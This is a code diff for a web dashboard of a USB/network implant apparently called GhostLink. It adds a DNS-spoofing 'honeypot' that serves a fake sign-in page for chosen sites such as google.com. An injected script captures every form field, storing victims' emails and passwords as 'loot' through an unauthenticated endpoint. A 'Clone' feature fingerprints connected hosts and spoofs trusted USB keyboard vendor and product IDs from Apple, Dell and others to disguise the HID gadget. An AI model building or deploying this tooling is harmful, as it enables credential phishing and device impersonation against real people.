+    if (j.ok) { toast && toast('Saved ' + j.size + ' bytes'); hpReload(); }
+    else alert('Save failed: ' + (j.err||''));
+  } catch(e) { alert('Save failed: ' + e); }
+}
+
+async function hpResetHtml() {
+  // Clear uploaded file; webui will fall through to bundled default
+  if (!confirm('Reset to bundled default page? (deletes your uploaded index.html)')) return;
+  try {
+    await fetch('/api/honeypot/index', {
+      method:'POST', credentials:'same-origin',
+      headers:{'Content-Type':'text/html'},
+      body: '' });
+    // Fetch default now
+    const r = await fetch('/api/honeypot/index', {credentials:'same-origin'});
+    const h = $('#hpHtml'); if (h) { h.value = await r.text(); h.dataset.loaded='1'; }
+    hpReload();
+  } catch(e) { alert('Reset failed: ' + e); }
+}
+
+function hpPreview() {
+  const w = window.open('', '_blank');
+  const html = ($('#hpHtml') && $('#hpHtml').value) || '';
+  w.document.open(); w.document.write(html); w.document.close();
+}
+
+async function hpSaveBehavior() {
+  // Write HONEYPOT_REDIRECT_AFTER and HONEYPOT_RULES back into config.txt
+  // via overlay so unrelated keys are untouched.
+  const after = ($('#hpAfter') && $('#hpAfter').value) || '';
+  const rules = ($('#hpRulesTxt') && $('#hpRulesTxt').value) || '';
+  await cfgOverlaySet({
+    HONEYPOT_REDIRECT_AFTER: after,
+    HONEYPOT_RULES:          rules.replace(/\r?\n/g, ';'),
+  });
+  hpReload();
+}
+
+async function hpClearLoot() {
+  if (!confirm('Clear all captured loot?')) return;
+  try { await fetch('/api/honeypot/loot_clear', {method:'POST', credentials:'same-origin'}); }
+  catch(e) {}
+  hpReloadLoot(); hpReload();
+}
+
+/* Overlay-write multiple keys into config.txt without clobbering other
+   lines. Fetches current config, splices each K=V, posts back. */
+async function cfgOverlaySet(kv) {
+  let txt = '';
+  try { const r = await fetch('/api/config', {credentials:'same-origin'}); txt = await r.text(); }
+  catch(e) {}
+  for (const [k, v] of Object.entries(kv)) {
+    const line = k + '=' + v;
+    const re = new RegExp('^' + k.replace(/[.*+?^${}()|[\]\\]/g,'\\$&') + '=.*$', 'm');
+    if (re.test(txt)) txt = txt.replace(re, line);
+    else txt += (txt.endsWith('\n') ? '' : '\n') + line + '\n';
+  }
+  CFG_RAW = txt;
+  const cfg = $('#cfg'); if (cfg) cfg.value = txt;
+  await fetch('/api/config', {method:'POST', credentials:'same-origin',
+                              headers:{'Content-Type':'text/plain'}, body: txt});
+}
+
 async function refreshNetLink() {
   // Fetches /api/net/link, paints the badges and enables / disables the
   // "Forwarded" segment based on eth0 carrier.
@@ -1640,6 +2122,25 @@ async function setNetMode(mode) {
   });
   if (r.ok) { toast(mode); refreshNetLink(); }
   else      { toast('mode change failed: ' + (r.err||''), true); }
+}
+
+async function clearRecordsLive() {
+  if (!confirm('wipe all records + verdicts? (safe while recording — files rotate afterwards)')) return;
+  const r = await api('/api/clear', { method:'POST' });
+  if (r.ok) { toast(`cleared ${r.removed} file${r.removed===1?'':'s'}`); refreshRecords(); tick(); }
+  else      { toast('clear failed', true); }
+}
+
+async function toggleStream() {
+  let txt = await api('/api/config');
+  if (typeof txt !== 'string') return;
+  const re = /^VERDICT_STREAM=.*$/m;
+  const cur = (txt.match(re) || [''])[0];
+  const next = cur.endsWith('TRUE') ? 'VERDICT_STREAM=FALSE' : 'VERDICT_STREAM=TRUE';
+  txt = cur ? txt.replace(re, next) : (txt + '\n' + next + '\n');
+  const r = await api('/api/config', { method:'POST', body: txt });
+  if (r.ok) { toast(next.endsWith('TRUE') ? 'streaming' : 'streaming paused'); tick(); }
+  else      { toast('toggle failed', true); }
 }
 
 async function toggleRecord() {
@@ -1691,7 +2192,7 @@ document.addEventListener('click', e => {
   const t = e.target.closest('.tablinks');
   if (t && t.dataset.tab) openTab(t.dataset.tab);
 });
-const TABS = ['Live','Records','Query','Config','HID','Scripting','LiveType','Terminal','System'];
+const TABS = ['Live','Records','Query','Config','Scripting','LiveType','Clone','Honeypot','Terminal','System'];
 window.addEventListener('hashchange', () => {
   const h = location.hash.slice(1);
   if (TABS.includes(h)) openTab(h);
@@ -2274,6 +2775,8 @@ function bindTerminal() {
   setInterval(tick, 2000);
   refreshNetLink();
   setInterval(refreshNetLink, 2500);
+  // live-save for switches
+  bindLiveSave();
   // Scripting
   bindEditor();
   updateGutter();
@@ -2354,6 +2857,144 @@ def read_stats():
     except Exception: return {}
 
 
+def _oui_vendor(mac):
+    """Best-effort OEM lookup from the OUI prefix of a MAC. We ship a tiny
+    hand-picked table of the vendors we actually see on consumer hardware
+    plus some brands popular with the Luckfox / rubber-ducky crowd. No
+    big-table lookup — this is a hint, not identity."""
+    if not mac: return ""
+    pfx = mac.upper().replace("-", ":").split(":")
+    if len(pfx) < 3: return ""
+    key = ":".join(pfx[:3])
+    return _OUI_MAP.get(key, "")
+
+
+_OUI_MAP = {
+    # a handful of the most common consumer OUIs — enough that most users
+    # see a label on their own laptop. Extend by editing this dict.
+    "00:50:56": "VMware",  "00:0C:29": "VMware",   "00:1C:14": "VMware",
+    "08:00:27": "VirtualBox", "52:54:00": "QEMU/KVM",
+    "DC:A6:32": "Raspberry Pi", "B8:27:EB": "Raspberry Pi",
+    "F0:18:98": "Apple",     "AC:DE:48": "Apple",   "D8:9E:F3": "Apple",
+    "3C:A6:F6": "Apple",     "7C:D1:C3": "Apple",
+    "88:66:5A": "Intel",     "D4:3B:04": "Intel",   "C8:F7:50": "Intel",
+    "00:1F:3B": "Intel",     "A4:C3:F0": "Intel",
+    "7C:B2:7D": "Dell",      "F8:B1:56": "Dell",    "D4:81:D7": "Dell",
+    "48:0F:CF": "ASUS",      "60:A4:4C": "ASUS",    "AC:22:0B": "ASUS",
+    "70:85:C2": "ASUS",
+    "E0:9D:31": "HP",        "A0:A3:3B": "HP",      "28:80:88": "HP",
+    "00:08:A1": "Microsoft (Surface)", "C8:3F:26": "Microsoft (Surface)",
+    "60:45:BD": "Microsoft (Surface)", "28:18:78": "Microsoft (Surface)",
+    "9C:5A:44": "Lenovo",    "28:F0:76": "Lenovo",  "68:F7:28": "Lenovo",
+    "F4:5C:89": "Lenovo",
+    "DE:2A:CC": "Random (locally-admin)",  # the user's Flo_Laptop :)
+}
+
+
+def _fingerprint_os(mac=None, hostname=None):
+    """Guess the host OS from DHCP breadcrumbs. Returns a dict with a
+    best-guess family and the signal we used."""
+    hints = []
+    guess = "unknown"
+    hn = (hostname or "").strip()
+    if hn:
+        hl = hn.lower()
+        # Windows-y names: DESKTOP-xxx, LAPTOP-xxx, PC-xxx, WIN-xxx
+        if re.match(r"^(desktop|laptop|pc|win)-", hl):
+            guess = "windows"; hints.append("hostname pattern")
+        elif hl.endswith(".local") or re.match(r"^[a-z]+-?s[- ]?mac", hl):
+            guess = "macos";   hints.append("hostname pattern")
+        elif hl.startswith("android-") or hl.startswith("samsung-"):
+            guess = "android"; hints.append("hostname pattern")
+        elif hl.startswith("iphone") or hl.startswith("ipad"):
+            guess = "ios";     hints.append("hostname pattern")
+    # locally-administered MACs (bit 1 of first octet set) are what Windows 10+
+    # uses for Wi-Fi randomization and Linux systemd-networkd uses too.
+    if mac:
+        try:
+            first = int(mac.replace("-", ":").split(":")[0], 16)
+            if first & 0x02:
+                hints.append("locally-admin MAC (randomized)")
+        except Exception: pass
+    return {"guess": guess, "hints": hints}
+
+
+def _check_internet(timeout=1.5):
+    """Non-blocking-ish check: can we reach 1.1.1.1:53 via TCP? Returns
+    {ok: bool, latency_ms: int|None, via: 'eth0'|'usb0'|'none'}."""
+    import socket as _socket
+    t0 = time.time()
+    s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        s.connect(("1.1.1.1", 53))
+        ms = int((time.time() - t0) * 1000)
+        # Which iface was the route taken via? read /proc/net/route for
+        # the default gateway iface.
+        via = "unknown"
+        try:
+            for ln in Path("/proc/net/route").read_text().splitlines()[1:]:
+                parts = ln.split()
+                if len(parts) >= 4 and parts[1] == "00000000":
+                    via = parts[0]; break
+        except Exception: pass
+        return {"ok": True, "latency_ms": ms, "via": via}
+    except Exception as e:
+        return {"ok": False, "err": str(e), "latency_ms": None, "via": "none"}
+    finally:
+        try: s.close()
+        except Exception: pass
+
+
+def _honeypot_rules(cfg):
+    """Parse HONEYPOT_RULES config block. One rule per line. The DSL is
+    intentionally forgiving — we accept extra whitespace, commas, equals,
+    and both direction forms:
+        ON SIGN_IN REDIRECT_TO https://google.com
+        ON WEBSITE_VISIT google.com REDIRECT_HONEYPOT
+    The second form adds `google.com` to the honeypot's trap list at
+    runtime so a user who visits google.com (via the WebBee's DNS) gets
+    the honeypot page served.
+    Returns a list of dicts: {trigger, to?, host?}.
+    """
+    out = []
+    raw = cfg.get("HONEYPOT_RULES", "") or ""
+    # Allow rules joined by ; or newlines
+    for line in re.split(r"[;\n]", raw):
+        s = line.strip().strip(",")
+        if not s or s.startswith("#"): continue
+        # Drop leading "ON "
+        if s.upper().startswith("ON "): s = s[3:].lstrip()
+        # Form A: SIGN_IN  REDIRECT_TO  https://x   (also accepts "=")
+        m = re.match(r"^SIGN_IN\s*=?\s*REDIRECT(?:_TO)?\s+(\S+)\s*$", s, re.IGNORECASE)
+        if m:
+            out.append({"trigger": "SIGN_IN", "to": m.group(1)})
+            continue
+        # Form B: WEBSITE_VISIT=google.com REDIRECT_HONEYPOT
+        m = re.match(r"^WEBSITE_VISIT\s*=?\s*(\S+?)\s+REDIRECT_HONEYPOT\s*$", s, re.IGNORECASE)
+        if m:
+            out.append({"trigger": "WEBSITE_VISIT", "host": m.group(1).lower()})
+            continue
+    return out
+
+
+def _honeypot_emit_verdict(rec):
+    """Append a verdict record to the current rec_NNNNNN.jsonl so the Live
+    tab's /api/live tail_verdicts picks it up immediately."""
+    VER_DIR.mkdir(parents=True, exist_ok=True)
+    # Reuse the newest verdict ring file so we don't fight sniff.py's
+    # rotation; create one if none exist yet.
+    files = sorted(VER_DIR.glob("rec_*.jsonl"), key=lambda p: p.stat().st_mtime, reverse=True)
+    if files:
+        target = files[0]
+    else:
+        target = VER_DIR / "rec_000000.jsonl"
+    try:
+        with open(target, "a") as f:
+            f.write(json.dumps(rec) + "\n")
+    except Exception: pass
+
+
 def tail_verdicts(n=50):
     try:
         files = sorted(VER_DIR.glob("rec_*.jsonl"), key=lambda p: p.stat().st_mtime, reverse=True)
@@ -2404,6 +3045,41 @@ def should_redirect(host_hdr: str, cfg: dict):
         p = p.split("/")[0]
         if h == p or h.endswith("." + p): return cfg.get("REDIRECT_TO", "172.32.0.93")
     return None
+
+
+# ====== bundled honeypot HTML (used if the user hasn't uploaded one) =======
+DEFAULT_HONEYPOT_HTML = """<!doctype html>
+<html lang=en><head><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<title>Sign in</title>
+<style>
+body { font: 14px/1.5 -apple-system,"Segoe UI",system-ui,sans-serif;
+       background:#f7f8fa; color:#1a1a1a; margin:0;
+       display:flex; align-items:center; justify-content:center; min-height:100vh; }
+.card { background:#fff; padding:36px 32px; border-radius:10px;
+        box-shadow:0 2px 20px rgba(0,0,0,.06); width:100%; max-width:360px; }
+h1 { margin:0 0 6px; font-size:22px; }
+p  { margin:0 0 20px; color:#5f6368; font-size:13px; }
+input { width:100%; padding:12px 14px; font-size:14px; border:1px solid #dadce0;
+        border-radius:6px; margin:6px 0; box-sizing:border-box; }
+input:focus { outline:none; border-color:#1a73e8; }
+button { width:100%; margin-top:12px; padding:12px; background:#1a73e8;
+         color:#fff; border:0; border-radius:6px; font-size:14px; cursor:pointer; }
+button:hover { background:#1557b0; }
+.foot { font-size:11px; color:#9aa0a6; margin-top:18px; text-align:center; }
+</style></head><body>
+<div class=card>
+<h1>Sign in</h1>
+<p>to continue to your account</p>
+<form method=post action="/_honeypot_submit">
+  <input type=email name=email placeholder="Email or phone" autocomplete=username autofocus required>
+  <input type=password name=password placeholder="Password" autocomplete=current-password required>
+  <button type=submit>Next</button>
+</form>
+<div class=foot>Verify this is a secure connection before signing in.</div>
+</div>
+</body></html>
+"""
 
 
 # ====== HTTP handler ========================================================
@@ -2521,7 +3197,70 @@ class Handler(http.server.BaseHTTPRequestHandler):
         except (BrokenPipeError, ConnectionResetError, OSError):
             pass
 
+    def _maybe_honeypot(self):
+        """If HONEYPOT=TRUE and the Host matches a REDIRECT_FROM pattern,
+        serve the honeypot index.html INSTEAD of 302'ing to REDIRECT_TO.
+        Form POSTs to /_honeypot_submit get captured + logged + redirected."""
+        cfg = load_cfg()
+        if cfg.get("HONEYPOT", "FALSE").upper() != "TRUE": return False
+        host = self.headers.get("Host", "")
+        if not host: return False
+        host = host.split(":")[0].strip().lower()
+        if host in ("172.32.0.93", "ghostlink.local", "localhost", "127.0.0.1"): return False
+        pats = [p.strip().lower() for p in (cfg.get("REDIRECT_FROM","") or "").split(",") if p.strip()]
+        # Also pull hosts from HONEYPOT_RULES `WEBSITE_VISIT=foo REDIRECT_HONEYPOT`
+        for r in _honeypot_rules(cfg):
+            if r.get("trigger") == "WEBSITE_VISIT" and r.get("host"):
+                pats.append(r["host"])
+        pats_norm = []
+        for pp in pats:
+            if pp.startswith("http://"):  pp = pp[7:]
+            if pp.startswith("https://"): pp = pp[8:]
+            pats_norm.append(pp.split("/")[0])
+        matches = (host in pats_norm) or any(host.endswith("." + p) for p in pats_norm)
+        if not matches: return False
+        # Only intercept GET / and POST /_honeypot_submit; let everything else
+        # fall through (so the admin's dashboard still reaches / when they
+        # visit via 172.32.0.93).
+        if self.path == "/_honeypot_submit": return False     # POST handler
+        html = ""
+        try: html = HONEY_HTML.read_text(encoding="utf-8")
+        except Exception:
+            html = DEFAULT_HONEYPOT_HTML
+        # inject a tiny JS shim that intercepts form submits and POSTs them
+        # to /_honeypot_submit so EVERY form (whatever markup the user
+        # uploads) gets captured without having to edit the HTML.
+        shim = """
+<script>
+document.addEventListener('submit', function(e){
+  const f = e.target; if (!f || f.tagName!=='FORM') return;
+  e.preventDefault();
+  const d = {};
+  for (const el of f.elements) {
+    if (!el.name) continue;
+    d[el.name] = el.type==='checkbox' ? !!el.checked : el.value;
+  }
+  d._src_host = location.host; d._ua = navigator.userAgent;
+  fetch('/_honeypot_submit', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(d)})
+    .then(r => r.json()).then(j => { if (j && j.to) location.href = j.to; });
+});
+</script>"""
+        if "</body>" in html.lower():
+            html = re.sub(r"</body>", shim + "</body>", html, count=1, flags=re.IGNORECASE)
+        else:
+            html = html + shim
+        self._send(200, "text/html; charset=utf-8", html,
+                   extra={"X-GhostLink-Honeypot": "1"})
+        try:
+            with open(LOG_PATH, "a") as f:
+                f.write(f"{time.strftime('%H:%M:%S')} webui HONEYPOT serve Host={host} path={self.path}\n")
+        except Exception: pass
+        return True
+
     def _maybe_redirect(self):
+        # Honeypot intercepts BEFORE the 302 redirect so a victim who hits a
+        # REDIRECT_FROM host sees the fake login instead of bouncing away.
+        if self._maybe_honeypot(): return True
         host = self.headers.get("Host", "")
         cfg = load_cfg()
         to = should_redirect(host, cfg)
@@ -2690,6 +3429,83 @@ class Handler(http.server.BaseHTTPRequestHandler):
                               .stdout.splitlines())
             )
             self._send_json(out)
+        elif p == "/api/clone/hosts":
+            # Return every host currently in the DHCP lease DB, enriched
+            # with OEM lookup + a quick OS guess, so the Clone tab can
+            # offer a "clone this host" button for each one.
+            leases = read_dhcp_leases()
+            now = int(time.time())
+            out = []
+            for L in leases:
+                exp = L.get("expires", 0) or 0
+                mac = L.get("mac") or ""
+                hn  = L.get("host") or ""
+                out.append({
+                    "mac":      mac,
+                    "ip":       L.get("ip") or "",
+                    "hostname": hn,
+                    "vendor":   _oui_vendor(mac),
+                    "os":       _fingerprint_os(mac, hn),
+                    "expires":  exp,
+                    "active":   bool(exp == 0 or exp > now),
+                })
+            self._send_json(out)
+        elif p == "/api/net/internet":
+            self._send_json(_check_internet())
+        elif p == "/api/honeypot/index":
+            # Return the current uploaded HTML (or the bundled default)
+            try: html = HONEY_HTML.read_text(encoding="utf-8") if HONEY_HTML.exists() else DEFAULT_HONEYPOT_HTML
+            except Exception: html = DEFAULT_HONEYPOT_HTML
+            self._send(200, "text/html; charset=utf-8", html)
+        elif p == "/api/honeypot/status":
+            cfg = load_cfg()
+            custom = HONEY_HTML.exists()
+            loot_n = 0
+            if HONEY_LOOT.exists():
+                try: loot_n = sum(1 for _ in HONEY_LOOT.open())
+                except Exception: pass
+            self._send_json({
+                "enabled":        cfg.get("HONEYPOT","FALSE").upper()=="TRUE",
+                "custom_html":    custom,
+                "html_size":      HONEY_HTML.stat().st_size if custom else len(DEFAULT_HONEYPOT_HTML),
+                "redirect_after": cfg.get("HONEYPOT_REDIRECT_AFTER",""),
+                "rules_text":     cfg.get("HONEYPOT_RULES",""),
+                "rules_parsed":   _honeypot_rules(cfg),
+                "loot_count":     loot_n,
+                "redirect_from":  cfg.get("REDIRECT_FROM",""),
+            })
+        elif p == "/api/honeypot/loot":
+            out = []
+            if HONEY_LOOT.exists():
+                try:
+                    with open(HONEY_LOOT) as f:
+                        for ln in f:
+                            try: out.append(json.loads(ln))
+                            except Exception: pass
+                except Exception: pass
+            # newest first, cap at 500
+            out.reverse()
+            self._send_json(out[:500])
+        elif p == "/api/clone/identity":
+            # Returns the current override values (if any) plus whether S50
+            # is actually sourcing them (patched).
+            d = {}
+            if ID_ENV.exists():
+                try:
+                    for ln in ID_ENV.read_text().splitlines():
+                        ln = ln.strip()
+                        if not ln or ln.startswith("#") or "=" not in ln: continue
+                        k, v = ln.split("=", 1)
+                        if k.startswith("USB_"):
+                            d[k[4:]] = v.strip().strip('"').strip("'")
+                except Exception: pass
+            # Is S50 patched to source our file?
+            patched = False
+            try:
+                s50 = Path("/etc/init.d/S50usbdevice").read_text()
+                patched = "ghostlink identity.env" in s50
+            except Exception: pass
+            self._send_json({"identity": d, "active": bool(d) and patched, "s50_patched": patched})
         elif p == "/api/extensions":
             out = []
             EXT_DIR.mkdir(parents=True, exist_ok=True)
@@ -2760,12 +3576,26 @@ class Handler(http.server.BaseHTTPRequestHandler):
             return self._send(413, "text/plain", "payload too large\n")
         body = self.rfile.read(n) if n else b""
         if u.path == "/api/config":
+            # Only reload dnsmasq if a DHCP/DNS/REDIRECT key actually
+            # changed. Flipping ENABLE_HID or BUTTON_PAYLOAD does NOT need
+            # a reload, and the 0.3-0.8 s dnsmasq restart gap was long
+            # enough to make the admin's PC lose its DHCP lease on some
+            # boots — "device becomes unreachable sometimes" after any
+            # unrelated config edit. Compare old vs new K=V pairs on
+            # a fixed key list and only reload when one of those changed.
+            NET_KEYS = ("DNSMASQ", "DNSMASQ_IFACE", "DHCP_RANGE",
+                        "DNS_UPSTREAM", "REDIRECT", "REDIRECT_FROM",
+                        "REDIRECT_TO", "DNS_SPOOF", "DNS_SPOOF_HOSTS",
+                        "HONEYPOT_RULES")
+            old = load_cfg()
             tmp = CFG_PATH.with_suffix(".new")
             tmp.write_bytes(body); tmp.replace(CFG_PATH)
-            # kick dnsmasq to pick up new address= rules
-            try: subprocess.run(["sh", str(ROOT/"ghostlink.sh"), "reload-dnsmasq"],
-                                timeout=5, capture_output=True)
-            except Exception: pass
+            new = load_cfg()
+            need_reload = any(old.get(k, "") != new.get(k, "") for k in NET_KEYS)
+            if need_reload:
+                try: subprocess.run(["sh", str(ROOT/"ghostlink.sh"), "reload-dnsmasq"],
+                                    timeout=5, capture_output=True)
+                except Exception: pass
             # NOTE: HID gadget rebind is intentionally NOT triggered here. On
             # the Luckfox RV1106 stock gadget, writing to UDC tears down
             # ffs.adb (FunctionFS backed by adbd); adbd does not survive the
@@ -2834,6 +3664,182 @@ class Handler(http.server.BaseHTTPRequestHandler):
             finally:
                 try: tmp.unlink()
                 except Exception: pass
+
+        # ---- clone: write / clear identity override ---------------------
+        # ---- Clone a specific DHCP-connected host as gadget identity ----
+        # The user picked a row from the Clone tab's "connected hosts"
+        # list. Build a plausible USB identity from it: Microsoft/Apple/etc
+        # VID/PID presets based on the OUI vendor, hostname → serial.
+        if u.path == "/api/clone/host_apply":
+            try: data = json.loads(body)
+            except Exception: data = {}
+            mac = (data.get("mac") or "").strip()
+            hostname = (data.get("hostname") or "").strip()
+            if not mac and not hostname:
+                return self._send_json({"ok": False, "err": "need mac or hostname"}, code=400)
+            vendor = _oui_vendor(mac)
+            # Pick a credible gadget identity to spoof. These are real,
+            # commonly-trusted VID/PID combos for benign HID / RNDIS
+            # devices. The gadget will enumerate as this; it does not
+            # mean the device BECOMES that product.
+            PRESETS = {
+                "Apple":              ("0x05ac", "0x024f", "Apple",   "Internal Keyboard"),
+                "Microsoft (Surface)":("0x045e", "0x0750", "Microsoft","Wired Keyboard 600"),
+                "Lenovo":             ("0x17ef", "0x6009", "Lenovo",  "USB Keyboard"),
+                "Dell":               ("0x413c", "0x2113", "Dell",    "KB216 Wired Keyboard"),
+                "HP":                 ("0x03f0", "0x0024", "HP",      "Basic USB Keyboard"),
+                "ASUS":               ("0x0b05", "0x1869", "ASUS",    "USB Keyboard"),
+                "Intel":              ("0x8087", "0x0032", "Intel",   "Wireless Bluetooth"),
+                "Raspberry Pi":       ("0x2e8a", "0x0003", "Raspberry Pi","Pico Keyboard"),
+                "VMware":             ("0x0e0f", "0x0003", "VMware",  "Virtual Mouse"),
+                "VirtualBox":         ("0x80ee", "0x0021", "innotek", "VBox USB Tablet"),
+            }
+            vid, pid, mfr, prod = PRESETS.get(vendor,
+                ("0x1d6b", "0x0104", "GhostLink", "Composite Device"))
+            # Serial: last 6 hex of MAC, or hostname sanitised.
+            def _clean(s, n=64):
+                s = re.sub(r"[\x00-\x1f\x7f\"\'\\`$]", "", str(s or ""))
+                return s.strip()[:n]
+            ser = _clean(mac.replace(":", "").replace("-", "").upper()[-6:] or hostname, 32)
+            prod_out = _clean(hostname, 64) or prod
+            lines = [
+                "# GhostLink identity override — generated by Clone-host.",
+                f"# Cloned from mac={mac} hostname={hostname} vendor={vendor or 'unknown'}",
+                f'USB_VID="{vid}"',
+                f'USB_PID="{pid}"',
+                f'USB_MFR="{mfr}"',
+                f'USB_PROD="{prod_out}"',
+                f'USB_SER="{ser}"',
+            ]
+            try:
+                tmp = ID_ENV.with_suffix(".new")
+                tmp.write_text("\n".join(lines) + "\n")
+                tmp.replace(ID_ENV)
+                return self._send_json({
+                    "ok": True,
+                    "identity": {"VID": vid, "PID": pid, "MFR": mfr,
+                                 "PROD": prod_out, "SER": ser,
+                                 "from_vendor": vendor},
+                })
+            except Exception as e:
+                return self._send_json({"ok": False, "err": str(e)}, code=500)
+
+        # ---- Honeypot: upload a custom index.html -----------------------
+        if u.path == "/api/honeypot/index":
+            if len(body) > 256 * 1024:
+                return self._send_json({"ok": False, "err": "html too large"}, code=413)
+            HONEY_DIR.mkdir(parents=True, exist_ok=True)
+            try:
+                tmp = HONEY_HTML.with_suffix(".new")
+                tmp.write_bytes(body); tmp.replace(HONEY_HTML)
+                return self._send_json({"ok": True, "size": HONEY_HTML.stat().st_size})
+            except Exception as e:
+                return self._send_json({"ok": False, "err": str(e)}, code=500)
+
+        # ---- Honeypot: form-capture target (victim POSTs here) ----------
+        # This is intentionally OUTSIDE the auth guard. The victim's browser
+        # is NOT logged in — we just want to capture whatever they typed
+        # into the fake form, log it, and bounce them to the redirect URL
+        # (or back to the real site).
+        if u.path == "/_honeypot_submit":
+            cfg = load_cfg()
+            # Parse either JSON (preferred, our form-shim) or urlencoded form
+            fields = {}
+            ct = (self.headers.get("Content-Type") or "").lower()
+            try:
+                if "json" in ct:
+                    fields = json.loads(body) if body else {}
+                else:
+                    for k, v in parse_qs(body.decode("utf-8", "replace")).items():
+                        fields[k] = v[0] if v else ""
+            except Exception:
+                fields = {}
+            # Build the loot record
+            rec = {
+                "t":    int(time.time()),
+                "ts":   time.strftime("%Y-%m-%d %H:%M:%S"),
+                "ip":   self._client_ip(),
+                "host": (self.headers.get("Host") or "").split(":")[0],
+                "ua":   self.headers.get("User-Agent", "")[:200],
+                "ref":  self.headers.get("Referer", "")[:200],
+                "data": {k: str(v)[:512] for k, v in fields.items()
+                         if not k.startswith("_")},
+            }
+            try:
+                HONEY_DIR.mkdir(parents=True, exist_ok=True)
+                with open(HONEY_LOOT, "a") as f:
+                    f.write(json.dumps(rec) + "\n")
+            except Exception: pass
+            # Emit a CRED verdict so Live tab lights up red
+            try:
+                values = " ".join(f"{k}={str(v)[:40]}" for k, v in rec["data"].items())
+                _honeypot_emit_verdict({
+                    "ts":   rec["ts"],
+                    "rule": "HONEYPOT_CRED",
+                    "host": rec["host"],
+                    "ip":   rec["ip"],
+                    "detail": f"UA={rec['ua'][:80]} :: {values}",
+                })
+            except Exception: pass
+            try:
+                with open(LOG_PATH, "a") as f:
+                    f.write(f"{time.strftime('%H:%M:%S')} honeypot CRED host={rec['host']} ip={rec['ip']} fields={list(rec['data'].keys())}\n")
+            except Exception: pass
+            # Where to send the victim: explicit redirect wins, else parsed
+            # rule DSL ON SIGN_IN REDIRECT_TO <url>, else back to host.
+            to = cfg.get("HONEYPOT_REDIRECT_AFTER", "").strip()
+            if not to:
+                for rule in _honeypot_rules(cfg):
+                    if rule.get("trigger") == "SIGN_IN" and rule.get("to"):
+                        to = rule["to"]; break
+            if not to:
+                to = f"https://{rec['host']}/" if rec["host"] else "/"
+            return self._send_json({"ok": True, "to": to})
+
+        # ---- Honeypot: delete captured loot (clear log) -----------------
+        if u.path == "/api/honeypot/loot_clear":
+            try:
+                if HONEY_LOOT.exists(): HONEY_LOOT.unlink()
+                return self._send_json({"ok": True})
+            except Exception as e:
+                return self._send_json({"ok": False, "err": str(e)}, code=500)
+
+        if u.path == "/api/clone/identity":
+            try: data = json.loads(body)
+            except Exception: data = {}
+            # Validate: VID/PID must be hex-ish or empty; strings sanitized
+            # for shell inclusion (strip quotes/backticks/dollar/newlines)
+            def _clean(s, n=64):
+                s = (str(s) if s is not None else "").strip()
+                s = re.sub(r"[\x00-\x1f\x7f\"\'\\`$]", "", s)
+                return s[:n]
+            vid  = _clean(data.get("VID"), 10)
+            pid  = _clean(data.get("PID"), 10)
+            mfr  = _clean(data.get("MFR"), 64)
+            prod = _clean(data.get("PROD"), 64)
+            ser  = _clean(data.get("SER"), 32)
+            if vid and not re.match(r"^(0x)?[0-9A-Fa-f]{1,4}$", vid):
+                return self._send_json({"ok": False, "err": "VID must be hex (e.g. 0x05ac)"}, code=400)
+            if pid and not re.match(r"^(0x)?[0-9A-Fa-f]{1,4}$", pid):
+                return self._send_json({"ok": False, "err": "PID must be hex"}, code=400)
+            if vid and not vid.lower().startswith("0x"): vid = "0x" + vid
+            if pid and not pid.lower().startswith("0x"): pid = "0x" + pid
+            lines = [
+                "# GhostLink identity override — sourced by patched S50usbdevice at boot.",
+                "# Delete or clear fields to restore the stock Rockchip identity.",
+            ]
+            if vid:  lines.append(f'USB_VID="{vid}"')
+            if pid:  lines.append(f'USB_PID="{pid}"')
+            if mfr:  lines.append(f'USB_MFR="{mfr}"')
+            if prod: lines.append(f'USB_PROD="{prod}"')
+            if ser:  lines.append(f'USB_SER="{ser}"')
+            try:
+                tmp = ID_ENV.with_suffix(".new")
+                tmp.write_text("\n".join(lines) + "\n")
+                tmp.replace(ID_ENV)
+                return self._send_json({"ok": True})
+            except Exception as e:
+                return self._send_json({"ok": False, "err": str(e)}, code=500)
 
         # ---- flip network mode (passive / forward) ----------------------
         if u.path == "/api/net/mode":
@@ -3123,6 +4129,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 return self._send_json({"ok": False, "err": "not found"}, code=404)
             try: fp.unlink(); return self._send_json({"ok": True})
             except Exception as e: return self._send_json({"ok": False, "err": str(e)}, code=500)
+        if u.path == "/api/clone/identity":
+            try:
+                if ID_ENV.exists(): ID_ENV.unlink()
+                return self._send_json({"ok": True})
+            except Exception as e:
+                return self._send_json({"ok": False, "err": str(e)}, code=500)
         self._send(404, "text/plain", "not found\n")
 
 
